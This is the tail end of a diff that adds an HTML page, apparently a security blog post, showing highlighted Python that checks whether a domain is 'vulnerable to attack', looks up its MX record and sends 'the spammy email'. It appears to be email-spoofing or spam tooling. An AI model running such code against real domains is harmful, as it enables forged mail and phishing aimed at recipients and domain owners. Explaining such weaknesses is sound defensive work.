+<span class="k">if</span> <span class="n">result</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="n">cprint</span><span class="p">((</span><span class="s">"[*]"</span> <span class="o">+</span> <span class="n">domain</span> <span class="o">+</span> <span class="s">" likely not vulnerable to attack."</span><span class="p">),</span><span class="s">"red"</span><span class="p">)</span>
+
+<span class="c"># Resolve the MX record for 'domain'</span>
+<span class="k">if</span> <span class="n">mx_record</span> <span class="ow">is</span> <span class="bp">None</span><span class="p">:</span>
+	<span class="n">mx_record</span> <span class="o">=</span> <span class="n">get_mx_record</span><span class="p">(</span><span class="n">domain</span><span class="p">)</span>
+
+<span class="c"># Send the spammy email</span>
+<span class="n">send_mail_message</span><span class="p">(</span><span class="n">mx_record</span><span class="p">,</span> <span class="n">fromaddr</span><span class="p">,</span> <span class="n">toaddr</span><span class="p">,</span> <span class="n">msg</span><span class="p">)</span>
+</code></pre></div></div>
+
+      </section>
+
+    </div>
+
+    
+  </body>
+</html>
